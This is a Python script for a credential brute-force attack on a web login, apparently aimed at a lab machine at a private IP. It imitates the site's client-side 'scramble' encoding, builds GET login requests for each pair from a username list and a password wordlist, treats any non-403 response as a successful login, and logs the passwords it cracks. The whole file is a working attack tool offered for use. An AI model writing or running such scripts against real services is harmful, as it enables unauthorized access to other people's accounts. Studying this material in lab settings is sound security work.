import requests
import random
import sys
import time

IP_ADDR            = "172.16.89.128"
PORT        	   = "8080"
PASSWORD_FILENAME  = "john.txt"
USERNAME_FILENAME  = "usernames.txt"
OUTPUT_FILENAME    = "password_cracker_output.txt"

# implements scramble used in js
# returns a string
def scramble(password):
	return "-".join([str(ord(c)) for c in password])

# creates GET request URL
# example: http://172.16.89.128:8080/$04743414665572345?pw=116-101-115-116&un=116-101-115-116.inbox
def create_url(username, password):
	req_template = "http://{ip}:{port}/${rand}?pw={pass}&un={user}.inbox"
	req_template = req_template.replace("{ip}", IP_ADDR)
	req_template = req_template.replace("{port}", PORT)
	req_template = req_template.replace("{rand}", str(random.random()).replace("0.",""))
	req_template = req_template.replace("{pass}", scramble(password))
	req_template = req_template.replace("{user}", scramble(username))
	return req_template

# tries to login with a given username/password pair
# returns True if successful, else False
def attempt_login(username, password):
	url = create_url(username,password)
	r = requests.get(url)
	if r.status_code != 403:
		return True
	return False

def main():
	# input username file
	try:
		username_f = open(USERNAME_FILENAME)
	except:
		sys.exit("Unable to open %s" % (USERNAME_FILENAME))

	# input password file
	try:
		password_f = open(PASSWORD_FILENAME,"r")
		passwords = [p.replace("\n","") for p in password_f if p]
		password_f.close()
	except:
		username_f.close()
		sys.exit("Unable to open %s" % (PASSWORD_FILENAME))

	# output file
	try:
		output_f = open(OUTPUT_FILENAME, "w")
	except:
		username_f.close()
		sys.exit("Unable to open %s" % (OUTPUT_FILENAME)) 

	# start logging
	start = time.time()
	num_cracked = 0
	num_failed = 0

	# try to crack each username's password
	for username in username_f:
		cracked = False
		username = username.replace("\n","")
		for password in passwords:
			if attempt_login(username.replace("\n",""), password):
				msg = "Password for username %s is %s" % (username, password)
				print msg
				output_f.write(msg+"\n")
				cracked = True
				num_cracked += 1
				break
		if not cracked:
			msg = "None of the passwords in %s worked for user %s" % (PASSWORD_FILENAME, username)
			print msg
			output_f.write(msg+"\n")
			num_failed += 1

	# print summary
	end = time.time()
	msg = "Summary: %d/%d passwords cracked in %s minutes" % (num_cracked,num_cracked+num_failed,(end-start)/60)
	print msg
	output_f.write(msg+"\n")

	# cleanup
	output_f.close()
	username_f.close()

if __name__ == '__main__':
	main()